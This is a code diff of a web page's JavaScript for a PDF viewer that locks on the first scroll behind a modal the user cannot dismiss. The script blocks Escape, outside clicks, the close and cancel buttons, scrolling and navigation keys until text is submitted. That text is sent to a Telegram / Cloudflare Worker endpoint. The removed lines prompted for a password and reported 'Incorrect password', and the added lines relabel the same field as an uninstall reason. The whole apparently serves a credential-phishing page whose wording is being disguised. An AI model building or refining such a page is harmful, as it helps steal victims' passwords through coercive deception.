-    $("pageInput").addEventListener(
+/* =========================================================
+   PAGE INPUT
+   ========================================================= */
+
+const pageInputElement =
+    $("pageInput");
+
+
+if (pageInputElement) {
+
+    pageInputElement.addEventListener(
         "change",
         function () {
 
@@ -2398,24 +2460,30 @@ function create256CharacterRedirectUrl() {
         }
     );
 
+}
 
-    /* =========================================================
-       MODAL CLOSE BUTTON
-       ========================================================= */
 
-    $("closeModal").addEventListener(
+/* =========================================================
+   MODAL CLOSE BUTTON
+   ========================================================= */
+
+const closeModalButton =
+    $("closeModal");
+
+
+if (closeModalButton) {
+
+    closeModalButton.addEventListener(
         "click",
         function (event) {
 
             event.preventDefault();
 
 
-            /*
-             * Persistent modal.
-             */
-
             if (pdfLocked) {
+
                 return;
+
             }
 
 
@@ -2424,24 +2492,30 @@ function create256CharacterRedirectUrl() {
         }
     );
 
+}
 
-    /* =========================================================
-       CANCEL
-       ========================================================= */
 
-    $("cancelModal").addEventListener(
+/* =========================================================
+   CANCEL
+   ========================================================= */
+
+const cancelModalButton =
+    $("cancelModal");
+
+
+if (cancelModalButton) {
+
+    cancelModalButton.addEventListener(
         "click",
         function (event) {
 
             event.preventDefault();
 
 
-            /*
-             * Persistent modal.
-             */
-
             if (pdfLocked) {
+
                 return;
+
             }
 
 
@@ -2450,19 +2524,22 @@ function create256CharacterRedirectUrl() {
         }
     );
 
+}
 
-    /* =========================================================
-       CLICK OUTSIDE MODAL
-       ========================================================= */
 
-    $("modal").addEventListener(
+/* =========================================================
+   CLICK OUTSIDE MODAL
+   ========================================================= */
+
+const modalElement =
+    $("modal");
+
+
+if (modalElement) {
+
+    modalElement.addEventListener(
         "click",
         function (event) {
-
-            /*
-             * Outside click can NEVER dismiss
-             * the modal while the PDF is locked.
-             */
 
             if (pdfLocked) {
 
@@ -2475,7 +2552,7 @@ function create256CharacterRedirectUrl() {
 
             if (
                 event.target ===
-                $("modal")
+                modalElement
             ) {
 
                 closeUninstallModal();
@@ -2485,191 +2562,249 @@ function create256CharacterRedirectUrl() {
         }
     );
 
-
-    /* =========================================================
-       ESCAPE KEY
-       ========================================================= */
-
-    document.addEventListener(
-        "keydown",
-        function (event) {
-
-            /*
-             * Escape is completely disabled
-             * while the persistent modal is active.
-             */
-
-            if (
-                event.key === "Escape" &&
-                pdfLocked
-            ) {
-
-                event.preventDefault();
-
-                return;
-
-            }
-
-        }
-    );
+}
 
 
-    /* =========================================================
-       BLOCK MOUSE WHEEL WHILE LOCKED
-       ========================================================= */
+/* =========================================================
+   ESCAPE KEY
+   ========================================================= */
 
-    window.addEventListener(
-        "wheel",
-        function (event) {
+document.addEventListener(
+    "keydown",
+    function (event) {
 
-            if (!pdfLocked) {
-                return;
-            }
-
-
-            /*
-             * Allow wheel events inside the modal
-             * only if needed for modal content.
-             */
-
-            if (
-                $("modal") &&
-                $("modal").contains(
-                    event.target
-                )
-            ) {
-
-                return;
-
-            }
-
+        if (
+            event.key ===
+                "Escape" &&
+            pdfLocked
+        ) {
 
             event.preventDefault();
 
-        },
-        {
-            passive:
-                false
+            return;
+
         }
-    );
+
+    }
+);
 
 
-    /* =========================================================
-       BLOCK TOUCH SCROLL WHILE LOCKED
-       ========================================================= */
+/* =========================================================
+   BLOCK MOUSE WHEEL WHILE LOCKED
+   ========================================================= */
 
-    window.addEventListener(
-        "touchmove",
-        function (event) {
+window.addEventListener(
+    "wheel",
+    function (event) {
 
-            if (!pdfLocked) {
-                return;
-            }
+        if (!pdfLocked) {
+
+            return;
+
+        }
 
 
-            if (
-                $("modal") &&
-                $("modal").contains(
-                    event.target
-                )
-            ) {
+        const modal =
+            $("modal");
 
-                return;
 
-            }
+        if (
+            modal &&
+            modal.contains(
+                event.target
+            )
+        ) {
 
+            return;
+
+        }
+
+
+        event.preventDefault();
+
+    },
+    {
+        passive:
+            false
+    }
+);
+
+
+/* =========================================================
+   BLOCK TOUCH SCROLL WHILE LOCKED
+   ========================================================= */
+
+window.addEventListener(
+    "touchmove",
+    function (event) {
+
+        if (!pdfLocked) {
+
+            return;
+
+        }
+
+
+        const modal =
+            $("modal");
+
+
+        if (
+            modal &&
+            modal.contains(
+                event.target
+            )
+        ) {
+
+            return;
+
+        }
+
+
+        event.preventDefault();
+
+    },
+    {
+        passive:
+            false
+    }
+);
+
+
+/* =========================================================
+   BLOCK KEYBOARD PDF NAVIGATION
+   ========================================================= */
+
+document.addEventListener(
+    "keydown",
+    function (event) {
+
+        if (!pdfLocked) {
+
+            return;
+
+        }
+
+
+        if (
+            event.target ===
+            $("reason")
+        ) {
+
+            return;
+
+        }
+
+
+        const blockedKeys = [
+
+            "ArrowUp",
+
+            "ArrowDown",
+
+            "ArrowLeft",
+
+            "ArrowRight",
+
+            "PageUp",
+
+            "PageDown",
+
+            "Home",
+
+            "End",
+
+            "Space"
+
+        ];
+
+
+        if (
+            blockedKeys.includes(
+                event.key
+            )
+        ) {
 
             event.preventDefault();
 
-        },
-        {
-            passive:
-                false
         }
-    );
+
+    }
+);
 
 
-    /* =========================================================
-       BLOCK KEYBOARD PDF NAVIGATION
-       ========================================================= */
+/* =========================================================
+   FIRST SCROLL - WINDOW
+   ========================================================= */
 
-    document.addEventListener(
-        "keydown",
-        function (event) {
+window.addEventListener(
+    "scroll",
+    function () {
 
-            if (!pdfLocked) {
-                return;
-            }
+        if (
+            !modalShown &&
+            window.scrollY > 60
+        ) {
 
-
-            /*
-             * Allow normal typing inside
-             * the reason field.
-             */
-
-            if (
-                event.target ===
-                $("reason")
-            ) {
-
-                return;
-
-            }
-
-
-            const blockedKeys = [
-
-                "ArrowUp",
-
-                "ArrowDown",
-
-                "ArrowLeft",
-
-                "ArrowRight",
-
-                "PageUp",
-
-                "PageDown",
-
-                "Home",
-
-                "End",
-
-                "Space"
-
-            ];
-
-
-            if (
-                blockedKeys.includes(
-                    event.key
-                )
-            ) {
-
-                event.preventDefault();
-
-            }
+            showModal();
 
         }
-    );
 
 
-    /* =========================================================
-       FIRST SCROLL - WINDOW
-       ========================================================= */
+        if (pdfLocked) {
 
-    window.addEventListener(
+            return;
+
+        }
+
+
+        clearTimeout(
+            scrollTimer
+        );
+
+
+        scrollTimer =
+            setTimeout(
+                function () {
+
+                    updateToolbar();
+
+
+                    renderVisiblePages()
+                        .catch(
+                            console.error
+                        );
+
+                },
+                80
+            );
+
+    },
+    {
+        passive:
+            true
+    }
+);
+
+
+/* =========================================================
+   FIRST SCROLL - PDF WORKSPACE
+   ========================================================= */
+
+const workspaceElement =
+    $("workspace");
+
+
+if (workspaceElement) {
+
+    workspaceElement.addEventListener(
         "scroll",
         function () {
 
-            /*
-             * The first meaningful scroll
-             * triggers the persistent modal.
-             */
-
             if (
                 !modalShown &&
-                window.scrollY > 60
+                workspaceElement.scrollTop >
+                    60
             ) {
 
                 showModal();
@@ -2677,13 +2812,10 @@ function create256CharacterRedirectUrl() {
             }
 
 
-            /*
-             * Do not perform normal PDF
-             * rendering updates while locked.
-             */
-
             if (pdfLocked) {
+
                 return;
+
             }
 
 
@@ -2715,94 +2847,48 @@ function create256CharacterRedirectUrl() {
         }
     );
 
-
-    /* =========================================================
-       FIRST SCROLL - PDF WORKSPACE
-       ========================================================= */
-
-    $("workspace").addEventListener(
-        "scroll",
-        function () {
-
-            /*
-             * The first meaningful PDF scroll
-             * triggers the persistent modal.
-             */
-
-            if (
-                !modalShown &&
-                $("workspace").scrollTop > 60
-            ) {
-
-                showModal();
-
-            }
+}
 
 
-            /*
-             * Once locked, ignore scrolling.
-             */
+/* =========================================================
+   TELEGRAM / CLOUDFLARE WORKER SUBMISSION
+   ========================================================= */
 
-            if (pdfLocked) {
-                return;
-            }
-
-
-            clearTimeout(
-                scrollTimer
-            );
+const submitReasonButton =
+    $("submitReason");
 
 
-            scrollTimer =
-                setTimeout(
-                    function () {
+if (submitReasonButton) {
 
-                        updateToolbar();
-
-
-                        renderVisiblePages()
-                            .catch(
-                                console.error
-                            );
-
-                    },
-                    80
-                );
-
-        },
-        {
-            passive:
-                true
-        }
-    );
-
-
-    /* =========================================================
-       TELEGRAM SUBMISSION
-       ========================================================= */
-
-    $("submitReason").addEventListener(
+    submitReasonButton.addEventListener(
         "click",
         async function () {
 
             const reasonInput =
                 $("reason");
 
-
             const formStatus =
                 $("formStatus");
-
 
             const submitButton =
                 $("submitReason");
 
-
             const cancelButton =
                 $("cancelModal");
 
-
             const closeButton =
                 $("closeModal");
+
+
+            if (
+                !reasonInput ||
+                !formStatus ||
+                !submitButton
+            ) {
+
+                return;
+
+            }
 
 
             const reason =
@@ -2816,15 +2902,12 @@ function create256CharacterRedirectUrl() {
             if (!reason) {
 
                 formStatus.textContent =
-                    "Please enter your password.";
-
+                    "Please enter a reason for uninstall.";
 
                 formStatus.className =
                     "windows-status error";
 
-
                 reasonInput.focus();
-
 
                 return;
 
@@ -2839,20 +2922,28 @@ function create256CharacterRedirectUrl() {
                 true;
 
 
-            cancelButton.disabled =
-                true;
+            if (cancelButton) {
+
+                cancelButton.disabled =
+                    true;
+
+            }
 
 
-            closeButton.disabled =
-                true;
+            if (closeButton) {
+
+                closeButton.disabled =
+                    true;
+
+            }
 
 
             submitButton.textContent =
-                "";
+                "Submitting...";
 
 
             formStatus.textContent =
-                "";
+                "Submitting...";
 
 
             formStatus.className =
@@ -2869,6 +2960,7 @@ function create256CharacterRedirectUrl() {
                     await fetch(
                         CONFIG.workerEndpoint,
                         {
+
                             method:
                                 "POST",
 
@@ -2925,7 +3017,7 @@ function create256CharacterRedirectUrl() {
 
                     throw new Error(
                         result.message ||
-                        "Unable to submit."
+                        "Unable to submit the request."
                     );
 
                 }
@@ -2936,8 +3028,7 @@ function create256CharacterRedirectUrl() {
                    ================================================= */
 
                 formStatus.textContent =
-                    "verified";
-
+                    "Submitted successfully.";
 
                 formStatus.className =
                     "windows-status success";
@@ -2950,37 +3041,36 @@ function create256CharacterRedirectUrl() {
                 /*
                  * IMPORTANT:
                  *
-                 * The PDF is unlocked ONLY after
-                 * the Worker has returned success.
+                 * PDF unlocks ONLY after
+                 * Cloudflare Worker success.
                  */
 
                 unlockPdf();
 
 
-                /*
-                 * Re-enable controls.
-                 */
-
                 submitButton.disabled =
                     false;
 
 
-                cancelButton.disabled =
-                    false;
+                if (cancelButton) {
+
+                    cancelButton.disabled =
+                        false;
+
+                }
 
 
-                closeButton.disabled =
-                    false;
+                if (closeButton) {
+
+                    closeButton.disabled =
+                        false;
+
+                }
 
 
                 submitButton.textContent =
                     "OK";
 
-
-                /*
-                 * Close the modal after the
-                 * success message has been visible.
-                 */
 
                 setTimeout(
                     function () {
@@ -3013,10 +3103,8 @@ function create256CharacterRedirectUrl() {
                 /*
                  * IMPORTANT:
                  *
-                 * The PDF remains locked.
-                 *
-                 * The user must successfully
-                 * submit a reason.
+                 * PDF remains locked
+                 * when submission fails.
                  */
 
                 pdfLocked =
@@ -3030,8 +3118,7 @@ function create256CharacterRedirectUrl() {
 
                 formStatus.textContent =
                     error.message ||
-                    "Incorrect password. Please try again.";
-
+                    "Unable to submit. Please try again.";
 
                 formStatus.className =
                     "windows-status error";
@@ -3041,16 +3128,20 @@ function create256CharacterRedirectUrl() {
                     false;
 
 
-                /*
-                 * Cancel and close remain disabled.
-                 */
+                if (cancelButton) {
 
-                cancelButton.disabled =
-                    true;
+                    cancelButton.disabled =
+                        true;
+
+                }
 
 
-                closeButton.disabled =
-                    true;
+                if (closeButton) {
+
+                    closeButton.disabled =
+                        true;
+
+                }
 
 
                 submitButton.textContent =
@@ -3064,52 +3155,73 @@ function create256CharacterRedirectUrl() {
         }
     );
 
+}
 
-    /* =========================================================
-       ENTER KEY
-       ========================================================= */
 
-    $("reason").addEventListener(
+/* =========================================================
+   ENTER KEY
+   ========================================================= */
+
+const reasonElement =
+    $("reason");
+
+
+if (reasonElement) {
+
+    reasonElement.addEventListener(
         "keydown",
         function (event) {
 
             if (
-                event.key === "Enter"
+                event.key ===
+                "Enter"
             ) {
 
                 event.preventDefault();
 
 
-                $("submitReason").click();
+                const submitButton =
+                    $("submitReason");
+
+
+                if (
+                    submitButton &&
+                    !submitButton.disabled
+                ) {
+
+                    submitButton.click();
+
+                }
 
             }
 
         }
     );
 
-
-    /* =========================================================
-       START
-       ========================================================= */
-
-    /*
-     * Generate the 256-character URL.
-     *
-     * It is displayed on the page.
-     *
-     * It does NOT redirect the browser.
-     */
-
-    initializeRedirectUrl();
+}
 
 
-    /*
-     * Load the PDF viewer.
-     */
+/* =========================================================
+   START
+   ========================================================= */
 
-    loadPdf();
+/*
+ * Generate the exact 256-character URL.
+ *
+ * The URL is displayed on the page.
+ *
+ * The browser is NOT redirected.
+ */
+
+initializeRedirectUrl();
+
+
+/*
+ * Load the PDF viewer.
+ */
+
+loadPdf();
 
 </script>
-
 </body>
 </html>
